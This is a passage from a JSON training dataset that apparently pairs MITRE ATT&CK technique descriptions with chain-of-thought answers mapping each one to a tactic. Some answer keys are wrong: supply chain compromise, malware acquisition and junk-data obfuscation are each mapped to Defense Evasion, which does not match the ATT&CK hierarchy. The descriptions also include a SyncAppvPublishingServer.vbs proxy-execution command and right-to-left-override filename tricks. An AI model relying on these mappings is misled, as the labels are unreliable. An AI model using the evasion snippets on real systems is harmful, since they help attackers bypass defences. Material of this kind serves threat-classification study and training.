    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
      "answer": "The given description is related to sub technique: Serverless (T1583.007);\nSub technique Serverless (T1583.007) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
    "context": "",
    "output": "The given description is related to sub technique PowerShell (T1059.001);\nSub technique PowerShell (T1059.001) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "answer": "The given description is related to sub technique PowerShell (T1059.001);\nSub technique PowerShell (T1059.001) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.\n\nFor example,  PowerShell commands may be invoked using:\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
    "context": "",
    "output": "The given description is related to sub technique SyncAppvPublishingServer (T1216.002);\nSub technique SyncAppvPublishingServer (T1216.002) is a type of technique System Script Proxy Execution (T1216);\nTechnique System Script Proxy Execution (T1216) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.\n\nFor example,  PowerShell commands may be invoked using:\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
      "answer": "The given description is related to sub technique SyncAppvPublishingServer (T1216.002);\nSub technique SyncAppvPublishingServer (T1216.002) is a type of technique System Script Proxy Execution (T1216);\nTechnique System Script Proxy Execution (T1216) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "context": "",
    "output": "The given description is related to sub technique: System Firmware (T1542.001);\nSub technique System Firmware (T1542.001) is a type of technique Pre-OS Boot (T1542);\nTechnique Pre-OS Boot (T1542) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
      "answer": "The given description is related to sub technique: System Firmware (T1542.001);\nSub technique System Firmware (T1542.001) is a type of technique Pre-OS Boot (T1542);\nTechnique Pre-OS Boot (T1542) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.?",
    "context": "",
    "output": "The given description is related to sub technique Email Accounts (T1586.002);\nSub technique Email Accounts (T1586.002) is a type of technique Compromise Accounts (T1586);\nTechnique Compromise Accounts (T1586) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.",
      "answer": "The given description is related to sub technique Email Accounts (T1586.002);\nSub technique Email Accounts (T1586.002) is a type of technique Compromise Accounts (T1586);\nTechnique Compromise Accounts (T1586) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.?",
    "context": "",
    "output": "The given description is related to sub technique Right-to-Left Override (T1036.002);\nSub technique Right-to-Left Override (T1036.002) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
      "answer": "The given description is related to sub technique Right-to-Left Override (T1036.002);\nSub technique Right-to-Left Override (T1036.002) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.?",
    "context": "",
    "output": "The given description is related to sub technique Spearphishing Attachment (T1566.001);\nSub technique Spearphishing Attachment (T1566.001) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The given description is related to sub technique Spearphishing Attachment (T1566.001);\nSub technique Spearphishing Attachment (T1566.001) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.?",
    "context": "",
    "output": "The given description is related to sub technique: Compromise Software Supply Chain (T1195.002);\nSub technique Compromise Software Supply Chain (T1195.002) is a type of technique Supply Chain Compromise (T1195);\nTechnique Supply Chain Compromise (T1195) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
      "answer": "The given description is related to sub technique: Compromise Software Supply Chain (T1195.002);\nSub technique Compromise Software Supply Chain (T1195.002) is a type of technique Supply Chain Compromise (T1195);\nTechnique Supply Chain Compromise (T1195) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).?",
    "context": "",
    "output": "The given description is related to sub technique: Visual Basic (T1059.005);\nSub technique Visual Basic (T1059.005) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "answer": "The given description is related to sub technique: Visual Basic (T1059.005);\nSub technique Visual Basic (T1059.005) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
    "context": "",
    "output": "The given description is related to sub technique Social Media Accounts (T1585.001);\nSub technique Social Media Accounts (T1585.001) is a type of technique Establish Accounts (T1585);\nTechnique Establish Accounts (T1585) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
      "answer": "The given description is related to sub technique Social Media Accounts (T1585.001);\nSub technique Social Media Accounts (T1585.001) is a type of technique Establish Accounts (T1585);\nTechnique Establish Accounts (T1585) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.",
    "context": "",
    "output": "The given description is related to sub technique HTML Smuggling (T1027.006);\nSub technique HTML Smuggling (T1027.006) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.",
      "answer": "The given description is related to sub technique HTML Smuggling (T1027.006);\nSub technique HTML Smuggling (T1027.006) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
    "context": "",
    "output": "The given description is related to sub technique: Steganography (T1001.002);\nSub technique Steganography (T1001.002) is a type of technique Data Obfuscation (T1001);\nTechnique Data Obfuscation (T1001) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
      "answer": "The given description is related to sub technique: Steganography (T1001.002);\nSub technique Steganography (T1001.002) is a type of technique Data Obfuscation (T1001);\nTechnique Data Obfuscation (T1001) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
    "context": "",
    "output": "The given description is related to sub technique: Malware (T1588.001);\nSub technique Malware (T1588.001) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
      "answer": "The given description is related to sub technique: Malware (T1588.001);\nSub technique Malware (T1588.001) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.?",
    "context": "",
    "output": "The given description is related to sub technique Junk Data (T1001.001);\nSub technique Junk Data (T1001.001) is a type of technique Data Obfuscation (T1001);\nTechnique Data Obfuscation (T1001) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",
      "answer": "The given description is related to sub technique Junk Data (T1001.001);\nSub technique Junk Data (T1001.001) is a type of technique Data Obfuscation (T1001);\nTechnique Data Obfuscation (T1001) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.",
    "context": "",
    "output": "The given description is related to sub technique: Process Argument Spoofing (T1564.010);\nSub technique Process Argument Spoofing (T1564.010) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.",
